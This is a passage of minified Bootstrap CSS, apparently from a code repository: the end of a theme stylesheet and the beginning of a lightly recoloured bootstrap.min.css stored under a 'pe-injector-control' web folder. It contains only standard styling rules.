100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#ffe8e8e8', GradientType=0);background-repeat:repeat-x}.dropdown-menu>.active>a,.dropdown-menu>.active>a:focus,.dropdown-menu>.active>a:hover{background-color:#2e6da4;background-image:-webkit-linear-gradient(top,#337ab7 0,#2e6da4 100%);background-image:-o-linear-gradient(top,#337ab7 0,#2e6da4 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#337ab7),to(#2e6da4));background-image:linear-gradient(to bottom,#337ab7 0,#2e6da4 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2e6da4', GradientType=0);background-repeat:repeat-x}.navbar-default{background-image:-webkit-linear-gradient(top,#fff 0,#f8f8f8 100%);background-image:-o-linear-gradient(top,#fff 0,#f8f8f8 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#fff),to(#f8f8f8));background-image:linear-gradient(to bottom,#fff 0,#f8f8f8 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff8f8f8', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-radius:4px;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 5px rgba(0,0,0,.075);box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 5px rgba(0,0,0,.075)}.navbar-default .navbar-nav>.active>a,.navbar-default .navbar-nav>.open>a{background-image:-webkit-linear-gradient(top,#dbdbdb 0,#e2e2e2 100%);background-image:-o-linear-gradient(top,#dbdbdb 0,#e2e2e2 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#dbdbdb),to(#e2e2e2));background-image:linear-gradient(to bottom,#dbdbdb 0,#e2e2e2 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdbdbdb', endColorstr='#ffe2e2e2', GradientType=0);background-repeat:repeat-x;-webkit-box-shadow:inset 0 3px 9px rgba(0,0,0,.075);box-shadow:inset 0 3px 9px rgba(0,0,0,.075)}.navbar-brand,.navbar-nav>li>a{text-shadow:0 1px 0 rgba(255,255,255,.25)}.navbar-inverse{background-image:-webkit-linear-gradient(top,#3c3c3c 0,#222 100%);background-image:-o-linear-gradient(top,#3c3c3c 0,#222 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#3c3c3c),to(#222));background-image:linear-gradient(to bottom,#3c3c3c 0,#222 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff3c3c3c', endColorstr='#ff222222', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x}.navbar-inverse .navbar-nav>.active>a,.navbar-inverse .navbar-nav>.open>a{background-image:-webkit-linear-gradient(top,#080808 0,#0f0f0f 100%);background-image:-o-linear-gradient(top,#080808 0,#0f0f0f 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#080808),to(#0f0f0f));background-image:linear-gradient(to bottom,#080808 0,#0f0f0f 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff080808', endColorstr='#ff0f0f0f', GradientType=0);background-repeat:repeat-x;-webkit-box-shadow:inset 0 3px 9px rgba(0,0,0,.25);box-shadow:inset 0 3px 9px rgba(0,0,0,.25)}.navbar-inverse .navbar-brand,.navbar-inverse .navbar-nav>li>a{text-shadow:0 -1px 0 rgba(0,0,0,.25)}.navbar-fixed-bottom,.navbar-fixed-top,.navbar-static-top{border-radius:0}@media (max-width:767px){.navbar .navbar-nav .open .dropdown-menu>.active>a,.navbar .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar .navbar-nav .open .dropdown-menu>.active>a:hover{color:#fff;background-image:-webkit-linear-gradient(top,#337ab7 0,#2e6da4 100%);background-image:-o-linear-gradient(top,#337ab7 0,#2e6da4 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#337ab7),to(#2e6da4));background-image:linear-gradient(to bottom,#337ab7 0,#2e6da4 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2e6da4', GradientType=0);background-repeat:repeat-x}}.alert{text-shadow:0 1px 0 rgba(255,255,255,.2);-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.25),0 1px 2px rgba(0,0,0,.05);box-shadow:inset 0 1px 0 rgba(255,255,255,.25),0 1px 2px rgba(0,0,0,.05)}.alert-success{background-image:-webkit-linear-gradient(top,#dff0d8 0,#c8e5bc 100%);background-image:-o-linear-gradient(top,#dff0d8 0,#c8e5bc 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#dff0d8),to(#c8e5bc));background-image:linear-gradient(to bottom,#dff0d8 0,#c8e5bc 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8', endColorstr='#ffc8e5bc', GradientType=0);background-repeat:repeat-x;border-color:#b2dba1}.alert-info{background-image:-webkit-linear-gradient(top,#d9edf7 0,#b9def0 100%);background-image:-o-linear-gradient(top,#d9edf7 0,#b9def0 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#d9edf7),to(#b9def0));background-image:linear-gradient(to bottom,#d9edf7 0,#b9def0 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7', endColorstr='#ffb9def0', GradientType=0);background-repeat:repeat-x;border-color:#9acfea}.alert-warning{background-image:-webkit-linear-gradient(top,#fcf8e3 0,#f8efc0 100%);background-image:-o-linear-gradient(top,#fcf8e3 0,#f8efc0 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#fcf8e3),to(#f8efc0));background-image:linear-gradient(to bottom,#fcf8e3 0,#f8efc0 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3', endColorstr='#fff8efc0', GradientType=0);background-repeat:repeat-x;border-color:#f5e79e}.alert-danger{background-image:-webkit-linear-gradient(top,#f2dede 0,#e7c3c3 100%);background-image:-o-linear-gradient(top,#f2dede 0,#e7c3c3 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f2dede),to(#e7c3c3));background-image:linear-gradient(to bottom,#f2dede 0,#e7c3c3 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede', endColorstr='#ffe7c3c3', GradientType=0);background-repeat:repeat-x;border-color:#dca7a7}.progress{background-image:-webkit-linear-gradient(top,#ebebeb 0,#f5f5f5 100%);background-image:-o-linear-gradient(top,#ebebeb 0,#f5f5f5 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#ebebeb),to(#f5f5f5));background-image:linear-gradient(to bottom,#ebebeb 0,#f5f5f5 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffebebeb', endColorstr='#fff5f5f5', GradientType=0);background-repeat:repeat-x}.progress-bar{background-image:-webkit-linear-gradient(top,#337ab7 0,#286090 100%);background-image:-o-linear-gradient(top,#337ab7 0,#286090 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#337ab7),to(#286090));background-image:linear-gradient(to bottom,#337ab7 0,#286090 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff286090', GradientType=0);background-repeat:repeat-x}.progress-bar-success{background-image:-webkit-linear-gradient(top,#5cb85c 0,#449d44 100%);background-image:-o-linear-gradient(top,#5cb85c 0,#449d44 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#5cb85c),to(#449d44));background-image:linear-gradient(to bottom,#5cb85c 0,#449d44 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c', endColorstr='#ff449d44', GradientType=0);background-repeat:repeat-x}.progress-bar-info{background-image:-webkit-linear-gradient(top,#5bc0de 0,#31b0d5 100%);background-image:-o-linear-gradient(top,#5bc0de 0,#31b0d5 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#5bc0de),to(#31b0d5));background-image:linear-gradient(to bottom,#5bc0de 0,#31b0d5 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de', endColorstr='#ff31b0d5', GradientType=0);background-repeat:repeat-x}.progress-bar-warning{background-image:-webkit-linear-gradient(top,#f0ad4e 0,#ec971f 100%);background-image:-o-linear-gradient(top,#f0ad4e 0,#ec971f 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f0ad4e),to(#ec971f));background-image:linear-gradient(to bottom,#f0ad4e 0,#ec971f 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e', endColorstr='#ffec971f', GradientType=0);background-repeat:repeat-x}.progress-bar-danger{background-image:-webkit-linear-gradient(top,#d9534f 0,#c9302c 100%);background-image:-o-linear-gradient(top,#d9534f 0,#c9302c 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#d9534f),to(#c9302c));background-image:linear-gradient(to bottom,#d9534f 0,#c9302c 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f', endColorstr='#ffc9302c', GradientType=0);background-repeat:repeat-x}.progress-bar-striped{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.list-group{border-radius:4px;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.075);box-shadow:0 1px 2px rgba(0,0,0,.075)}.list-group-item.active,.list-group-item.active:focus,.list-group-item.active:hover{text-shadow:0 -1px 0 #286090;background-image:-webkit-linear-gradient(top,#337ab7 0,#2b669a 100%);background-image:-o-linear-gradient(top,#337ab7 0,#2b669a 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#337ab7),to(#2b669a));background-image:linear-gradient(to bottom,#337ab7 0,#2b669a 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2b669a', GradientType=0);background-repeat:repeat-x;border-color:#2b669a}.list-group-item.active .badge,.list-group-item.active:focus .badge,.list-group-item.active:hover .badge{text-shadow:none}.panel{-webkit-box-shadow:0 1px 2px rgba(0,0,0,.05);box-shadow:0 1px 2px rgba(0,0,0,.05)}.panel-default>.panel-heading{background-image:-webkit-linear-gradient(top,#f5f5f5 0,#e8e8e8 100%);background-image:-o-linear-gradient(top,#f5f5f5 0,#e8e8e8 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#e8e8e8));background-image:linear-gradient(to bottom,#f5f5f5 0,#e8e8e8 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#ffe8e8e8', GradientType=0);background-repeat:repeat-x}.panel-primary>.panel-heading{background-image:-webkit-linear-gradient(top,#3c3c3c 0,#222 100%);background-image:-o-linear-gradient(top,#3c3c3c 0,#222 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#3c3c3c),to(#222));background-image:linear-gradient(to bottom,#3c3c3c 0,#222 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#3c3c3c', endColorstr='#222', GradientType=0);background-repeat:repeat-x}.panel-success>.panel-heading{background-image:-webkit-linear-gradient(top,#dff0d8 0,#d0e9c6 100%);background-image:-o-linear-gradient(top,#dff0d8 0,#d0e9c6 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#dff0d8),to(#d0e9c6));background-image:linear-gradient(to bottom,#dff0d8 0,#d0e9c6 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8', endColorstr='#ffd0e9c6', GradientType=0);background-repeat:repeat-x}.panel-info>.panel-heading{background-image:-webkit-linear-gradient(top,#d9edf7 0,#c4e3f3 100%);background-image:-o-linear-gradient(top,#d9edf7 0,#c4e3f3 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#d9edf7),to(#c4e3f3));background-image:linear-gradient(to bottom,#d9edf7 0,#c4e3f3 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7', endColorstr='#ffc4e3f3', GradientType=0);background-repeat:repeat-x}.panel-warning>.panel-heading{background-image:-webkit-linear-gradient(top,#fcf8e3 0,#faf2cc 100%);background-image:-o-linear-gradient(top,#fcf8e3 0,#faf2cc 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#fcf8e3),to(#faf2cc));background-image:linear-gradient(to bottom,#fcf8e3 0,#faf2cc 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3', endColorstr='#fffaf2cc', GradientType=0);background-repeat:repeat-x}.panel-danger>.panel-heading{background-image:-webkit-linear-gradient(top,#f2dede 0,#ebcccc 100%);background-image:-o-linear-gradient(top,#f2dede 0,#ebcccc 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f2dede),to(#ebcccc));background-image:linear-gradient(to bottom,#f2dede 0,#ebcccc 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede', endColorstr='#ffebcccc', GradientType=0);background-repeat:repeat-x}.well{background-image:-webkit-linear-gradient(top,#e8e8e8 0,#f5f5f5 100%);background-image:-o-linear-gradient(top,#e8e8e8 0,#f5f5f5 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#e8e8e8),to(#f5f5f5));background-image:linear-gradient(to bottom,#e8e8e8 0,#f5f5f5 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffe8e8e8', endColorstr='#fff5f5f5', GradientType=0);background-repeat:repeat-x;border-color:#dcdcdc;-webkit-box-shadow:inset 0 1px 3px rgba(0,0,0,.05),0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 3px rgba(0,0,0,.05),0 1px 0 rgba(255,255,255,.1)}
```

`pe-injector-control/html/css/bootstrap.min.css`:

```css
/*!
 * Bootstrap v3.3.4 (http://getbootstrap.com)
 * Copyright 2011-2015 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 *//*! normalize.css v3.0.2 | MIT License | git.io/normalize */html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{margin:.67em 0;font-size:2em}mark{color:#000;background:#ff0}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{height:0;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;font:inherit;color:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type=checkbox],input[type=radio]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;-webkit-appearance:textfield}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{padding:.35em .625em .75em;margin:0 2px;border:1px solid silver}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}/*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */@media print{*,:after,:before{color:#000!important;text-shadow:none!important;background:0 0!important;-webkit-box-shadow:none!important;box-shadow:none!important}a,a:visited{text-decoration:underline}a[href]:after{content:" (" attr(href) ")"}abbr[title]:after{content:" (" attr(title) ")"}a[href^="javascript:"]:after,a[href^="#"]:after{content:""}blockquote,pre{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}img{max-width:100%!important}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}select{background:#fff!important}.navbar{display:none}.btn>.caret,.dropup>.btn>.caret{border-top-color:#000!important}.label{border:1px solid #000}.table{border-collapse:collapse!important}.table td,.table th{background-color:#fff!important}.table-bordered td,.table-bordered th{border:1px solid #ddd!important}}@font-face{font-family:'Glyphicons Halflings';src:url(../fonts/glyphicons-halflings-regular.eot);src:url(../fonts/glyphicons-halflings-regular.eot?#iefix) format('embedded-opentype'),url(../fonts/glyphicons-halflings-regular.woff2) format('woff2'),url(../fonts/glyphicons-halflings-regular.woff) format('woff'),url(../fonts/glyphicons-halflings-regular.ttf) format('truetype'),url(../fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular) format('svg')}.glyphicon{position:relative;top:1px;display:inline-block;font-family:'Glyphicons Halflings';font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.glyphicon-asterisk:before{content:"\2a"}.glyphicon-plus:before{content:"\2b"}.glyphicon-eur:before,.glyphicon-euro:before{content:"\20ac"}.glyphicon-minus:before{content:"\2212"}.glyphicon-cloud:before{content:"\2601"}.glyphicon-envelope:before{content:"\2709"}.glyphicon-pencil:before{content:"\270f"}.glyphicon-glass:before{content:"\e001"}.glyphicon-music:before{content:"\e002"}.glyphicon-search:before{content:"\e003"}.glyphicon-heart:before{content:"\e005"}.glyphicon-star:before{content:"\e006"}.glyphicon-star-empty:before{content:"\e007"}.glyphicon-user:before{content:"\e008"}.glyphicon-film:before{content:"\e009"}.glyphicon-th-large:before{content:"\e010"}.glyphicon-th:before{content:"\e011"}.glyphicon-th-list:before{content:"\e012"}.glyphicon-ok:before{content:"\e013"}.glyphicon-remove:before{content:"\e014"}.glyphicon-zoom-in:before{content:"\e015"}.glyphicon-zoom-out:before{content:"\e016"}.glyphicon-off:before{content:"\e017"}.glyphicon-signal:before{content:"\e018"}.glyphicon-cog:before{content:"\e019"}.glyphicon-trash:before{content:"\e020"}.glyphicon-home:before{content:"\e021"}.glyphicon-file:before{content:"\e022"}.glyphicon-time:before{content:"\e023"}.glyphicon-road:before{content:"\e024"}.glyphicon-download-alt:before{content:"\e025"}.glyphicon-download:before{content:"\e026"}.glyphicon-upload:before{content:"\e027"}.glyphicon-inbox:before{content:"\e028"}.glyphicon-play-circle:before{content:"\e029"}.glyphicon-repeat:before{content:"\e030"}.glyphicon-refresh:before{content:"\e031"}.glyphicon-list-alt:before{content:"\e032"}.glyphicon-lock:before{content:"\e033"}.glyphicon-flag:before{content:"\e034"}.glyphicon-headphones:before{content:"\e035"}.glyphicon-volume-off:before{content:"\e036"}.glyphicon-volume-down:before{content:"\e037"}.glyphicon-volume-up:before{content:"\e038"}.glyphicon-qrcode:before{content:"\e039"}.glyphicon-barcode:before{content:"\e040"}.glyphicon-tag:before{content:"\e041"}.glyphicon-tags:before{content:"\e042"}.glyphicon-book:before{content:"\e043"}.glyphicon-bookmark:before{content:"\e044"}.glyphicon-print:before{content:"\e045"}.glyphicon-camera:before{content:"\e046"}.glyphicon-font:before{content:"\e047"}.glyphicon-bold:before{content:"\e048"}.glyphicon-italic:before{content:"\e049"}.glyphicon-text-height:before{content:"\e050"}.glyphicon-text-width:before{content:"\e051"}.glyphicon-align-left:before{content:"\e052"}.glyphicon-align-center:before{content:"\e053"}.glyphicon-align-right:before{content:"\e054"}.glyphicon-align-justify:before{content:"\e055"}.glyphicon-list:before{content:"\e056"}.glyphicon-indent-left:before{content:"\e057"}.glyphicon-indent-right:before{content:"\e058"}.glyphicon-facetime-video:before{content:"\e059"}.glyphicon-picture:before{content:"\e060"}.glyphicon-map-marker:before{content:"\e062"}.glyphicon-adjust:before{content:"\e063"}.glyphicon-tint:before{content:"\e064"}.glyphicon-edit:before{content:"\e065"}.glyphicon-share:before{content:"\e066"}.glyphicon-check:before{content:"\e067"}.glyphicon-move:before{content:"\e068"}.glyphicon-step-backward:before{content:"\e069"}.glyphicon-fast-backward:before{content:"\e070"}.glyphicon-backward:before{content:"\e071"}.glyphicon-play:before{content:"\e072"}.glyphicon-pause:before{content:"\e073"}.glyphicon-stop:before{content:"\e074"}.glyphicon-forward:before{content:"\e075"}.glyphicon-fast-forward:before{content:"\e076"}.glyphicon-step-forward:before{content:"\e077"}.glyphicon-eject:before{content:"\e078"}.glyphicon-chevron-left:before{content:"\e079"}.glyphicon-chevron-right:before{content:"\e080"}.glyphicon-plus-sign:before{content:"\e081"}.glyphicon-minus-sign:before{content:"\e082"}.glyphicon-remove-sign:before{content:"\e083"}.glyphicon-ok-sign:before{content:"\e084"}.glyphicon-question-sign:before{content:"\e085"}.glyphicon-info-sign:before{content:"\e086"}.glyphicon-screenshot:before{content:"\e087"}.glyphicon-remove-circle:before{content:"\e088"}.glyphicon-ok-circle:before{content:"\e089"}.glyphicon-ban-circle:before{content:"\e090"}.glyphicon-arrow-left:before{content:"\e091"}.glyphicon-arrow-right:before{content:"\e092"}.glyphicon-arrow-up:before{content:"\e093"}.glyphicon-arrow-down:before{content:"\e094"}.glyphicon-share-alt:before{content:"\e095"}.glyphicon-resize-full:before{content:"\e096"}.glyphicon-resize-small:before{content:"\e097"}.glyphicon-exclamation-sign:before{content:"\e101"}.glyphicon-gift:before{content:"\e102"}.glyphicon-leaf:before{content:"\e103"}.glyphicon-fire:before{content:"\e104"}.glyphicon-eye-open:before{content:"\e105"}.glyphicon-eye-close:before{content:"\e106"}.glyphicon-warning-sign:before{content:"\e107"}.glyphicon-plane:before{content:"\e108"}.glyphicon-calendar:before{content:"\e109"}.glyphicon-random:before{content:"\e110"}.glyphicon-comment:before{content:"\e111"}.glyphicon-magnet:before{content:"\e112"}.glyphicon-chevron-up:before{content:"\e113"}.glyphicon-chevron-down:before{content:"\e114"}.glyphicon-retweet:before{content:"\e115"}.glyphicon-shopping-cart:before{content:"\e116"}.glyphicon-folder-close:before{content:"\e117"}.glyphicon-folder-open:before{content:"\e118"}.glyphicon-resize-vertical:before{content:"\e119"}.glyphicon-resize-horizontal:before{content:"\e120"}.glyphicon-hdd:before{content:"\e121"}.glyphicon-bullhorn:before{content:"\e122"}.glyphicon-bell:before{content:"\e123"}.glyphicon-certificate:before{content:"\e124"}.glyphicon-thumbs-up:before{content:"\e125"}.glyphicon-thumbs-down:before{content:"\e126"}.glyphicon-hand-right:before{content:"\e127"}.glyphicon-hand-left:before{content:"\e128"}.glyphicon-hand-up:before{content:"\e129"}.glyphicon-hand-down:before{content:"\e130"}.glyphicon-circle-arrow-right:before{content:"\e131"}.glyphicon-circle-arrow-left:before{content:"\e132"}.glyphicon-circle-arrow-up:before{content:"\e133"}.glyphicon-circle-arrow-down:before{content:"\e134"}.glyphicon-globe:before{content:"\e135"}.glyphicon-wrench:before{content:"\e136"}.glyphicon-tasks:before{content:"\e137"}.glyphicon-filter:before{content:"\e138"}.glyphicon-briefcase:before{content:"\e139"}.glyphicon-fullscreen:before{content:"\e140"}.glyphicon-dashboard:before{content:"\e141"}.glyphicon-paperclip:before{content:"\e142"}.glyphicon-heart-empty:before{content:"\e143"}.glyphicon-link:before{content:"\e144"}.glyphicon-phone:before{content:"\e145"}.glyphicon-pushpin:before{content:"\e146"}.glyphicon-usd:before{content:"\e148"}.glyphicon-gbp:before{content:"\e149"}.glyphicon-sort:before{content:"\e150"}.glyphicon-sort-by-alphabet:before{content:"\e151"}.glyphicon-sort-by-alphabet-alt:before{content:"\e152"}.glyphicon-sort-by-order:before{content:"\e153"}.glyphicon-sort-by-order-alt:before{content:"\e154"}.glyphicon-sort-by-attributes:before{content:"\e155"}.glyphicon-sort-by-attributes-alt:before{content:"\e156"}.glyphicon-unchecked:before{content:"\e157"}.glyphicon-expand:before{content:"\e158"}.glyphicon-collapse-down:before{content:"\e159"}.glyphicon-collapse-up:before{content:"\e160"}.glyphicon-log-in:before{content:"\e161"}.glyphicon-flash:before{content:"\e162"}.glyphicon-log-out:before{content:"\e163"}.glyphicon-new-window:before{content:"\e164"}.glyphicon-record:before{content:"\e165"}.glyphicon-save:before{content:"\e166"}.glyphicon-open:before{content:"\e167"}.glyphicon-saved:before{content:"\e168"}.glyphicon-import:before{content:"\e169"}.glyphicon-export:before{content:"\e170"}.glyphicon-send:before{content:"\e171"}.glyphicon-floppy-disk:before{content:"\e172"}.glyphicon-floppy-saved:before{content:"\e173"}.glyphicon-floppy-remove:before{content:"\e174"}.glyphicon-floppy-save:before{content:"\e175"}.glyphicon-floppy-open:before{content:"\e176"}.glyphicon-credit-card:before{content:"\e177"}.glyphicon-transfer:before{content:"\e178"}.glyphicon-cutlery:before{content:"\e179"}.glyphicon-header:before{content:"\e180"}.glyphicon-compressed:before{content:"\e181"}.glyphicon-earphone:before{content:"\e182"}.glyphicon-phone-alt:before{content:"\e183"}.glyphicon-tower:before{content:"\e184"}.glyphicon-stats:before{content:"\e185"}.glyphicon-sd-video:before{content:"\e186"}.glyphicon-hd-video:before{content:"\e187"}.glyphicon-subtitles:before{content:"\e188"}.glyphicon-sound-stereo:before{content:"\e189"}.glyphicon-sound-dolby:before{content:"\e190"}.glyphicon-sound-5-1:before{content:"\e191"}.glyphicon-sound-6-1:before{content:"\e192"}.glyphicon-sound-7-1:before{content:"\e193"}.glyphicon-copyright-mark:before{content:"\e194"}.glyphicon-registration-mark:before{content:"\e195"}.glyphicon-cloud-download:before{content:"\e197"}.glyphicon-cloud-upload:before{content:"\e198"}.glyphicon-tree-conifer:before{content:"\e199"}.glyphicon-tree-deciduous:before{content:"\e200"}.glyphicon-cd:before{content:"\e201"}.glyphicon-save-file:before{content:"\e202"}.glyphicon-open-file:before{content:"\e203"}.glyphicon-level-up:before{content:"\e204"}.glyphicon-copy:before{content:"\e205"}.glyphicon-paste:before{content:"\e206"}.glyphicon-alert:before{content:"\e209"}.glyphicon-equalizer:before{content:"\e210"}.glyphicon-king:before{content:"\e211"}.glyphicon-queen:before{content:"\e212"}.glyphicon-pawn:before{content:"\e213"}.glyphicon-bishop:before{content:"\e214"}.glyphicon-knight:before{content:"\e215"}.glyphicon-baby-formula:before{content:"\e216"}.glyphicon-tent:before{content:"\26fa"}.glyphicon-blackboard:before{content:"\e218"}.glyphicon-bed:before{content:"\e219"}.glyphicon-apple:before{content:"\f8ff"}.glyphicon-erase:before{content:"\e221"}.glyphicon-hourglass:before{content:"\231b"}.glyphicon-lamp:before{content:"\e223"}.glyphicon-duplicate:before{content:"\e224"}.glyphicon-piggy-bank:before{content:"\e225"}.glyphicon-scissors:before{content:"\e226"}.glyphicon-bitcoin:before{content:"\e227"}.glyphicon-btc:before{content:"\e227"}.glyphicon-xbt:before{content:"\e227"}.glyphicon-yen:before{content:"\00a5"}.glyphicon-jpy:before{content:"\00a5"}.glyphicon-ruble:before{content:"\20bd"}.glyphicon-rub:before{content:"\20bd"}.glyphicon-scale:before{content:"\e230"}.glyphicon-ice-lolly:before{content:"\e231"}.glyphicon-ice-lolly-tasted:before{content:"\e232"}.glyphicon-education:before{content:"\e233"}.glyphicon-option-horizontal:before{content:"\e234"}.glyphicon-option-vertical:before{content:"\e235"}.glyphicon-menu-hamburger:before{content:"\e236"}.glyphicon-modal-window:before{content:"\e237"}.glyphicon-oil:before{content:"\e238"}.glyphicon-grain:before{content:"\e239"}.glyphicon-sunglasses:before{content:"\e240"}.glyphicon-text-size:before{content:"\e241"}.glyphicon-text-color:before{content:"\e242"}.glyphicon-text-background:before{content:"\e243"}.glyphicon-object-align-top:before{content:"\e244"}.glyphicon-object-align-bottom:before{content:"\e245"}.glyphicon-object-align-horizontal:before{content:"\e246"}.glyphicon-object-align-left:before{content:"\e247"}.glyphicon-object-align-vertical:before{content:"\e248"}.glyphicon-object-align-right:before{content:"\e249"}.glyphicon-triangle-right:before{content:"\e250"}.glyphicon-triangle-left:before{content:"\e251"}.glyphicon-triangle-bottom:before{content:"\e252"}.glyphicon-triangle-top:before{content:"\e253"}.glyphicon-console:before{content:"\e254"}.glyphicon-superscript:before{content:"\e255"}.glyphicon-subscript:before{content:"\e256"}.glyphicon-menu-left:before{content:"\e257"}.glyphicon-menu-right:before{content:"\e258"}.glyphicon-menu-down:before{content:"\e259"}.glyphicon-menu-up:before{content:"\e260"}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857143;color:#F5F5F5;background-color:#444}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a{color:#9FADFF;text-decoration:none}a:focus,a:hover{color:#042AFE;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}figure{margin:0}img{vertical-align:middle}.carousel-inner>.item>a>img,.carousel-inner>.item>img,.img-responsive,.thumbnail a>img,.thumbnail>img{display:block;max-width:100%;height:auto}.img-rounded{border-radius:6px}.img-thumbnail{display:inline-block;max-width:100%;height:auto;padding:4px;line-height:1.42857143;background-color:#fff;border:1px solid 